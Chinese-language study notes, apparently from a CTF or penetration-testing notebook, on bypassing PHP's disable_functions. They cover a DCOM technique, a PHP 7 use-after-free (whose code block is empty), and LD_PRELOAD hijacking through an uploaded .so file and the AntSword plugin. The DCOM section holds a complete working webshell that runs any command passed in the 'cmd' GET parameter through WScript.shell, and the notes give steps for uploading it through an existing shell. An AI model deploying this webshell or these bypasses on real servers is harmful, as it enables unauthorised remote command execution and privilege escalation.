我们的 disable_function 也就是禁止我们去执行我们的

## 第零步：
打开我们的 phpinfo 文件，查看 php 禁止了哪些条件。

## DCMO 绕过：
### 前提 ：
我们查看靶机的 PHPinfo, 要求我们的 dcom 组件是已经开启了的。

### 步骤：
第一步：利用我们的之前已经存在的 webshell，将我们的脚本上传到我们的文件当中，命名为我们的 `xxxx.php`

第二步：直接调用我们的新的 `xxxx.php` 作为我们的新webshell

### 脚本：
```
<?php
$command = $_GET['cmd'];
$wsh = new COM('WScript.shell'); // 生成一个COM对象Shell.Application也能
$exec = $wsh->exec("cmd /c".$command); //调用对象方法来执行命令
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
```

## UAF 漏洞绕过
### 前提：
我们存在我们的类，并且我们的 php 版本在 7.0 以上

我们的方法是利用了我们的 `php7.0` 中存在的一个漏洞：由于 php7.0 中的垃圾回收机制造成的 `UAF` 漏洞。

这里，我们可以使用我们的 github 上已有的脚本来执行我们的对应的方法。
```

```



## LD_PRELOAD 绕过
LD_PRELOAD 是 Linux 中的一个环境变量，影响我们的程序的连接，允许个人在定义在程序运行前优先执行的程序或者动态链接库。

总的来说就是= `LD_PRELOAD` 指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果。

原理：上传.so 脚本（劫持 php 程序，重新启动一个新的 php 进程接收.antproxy.php 请求）和.antproxy.php
如果网站服务器可以提升权限至 root，可以通过 root 用户执行 `php -S 0.0.0.0:9090` 通过9090端口访问的 webshell 即为 root 权限

### 复现方法：
1. 直接利用蚁剑插件来进行绕过
![[Pasted image 20240425115905.png]]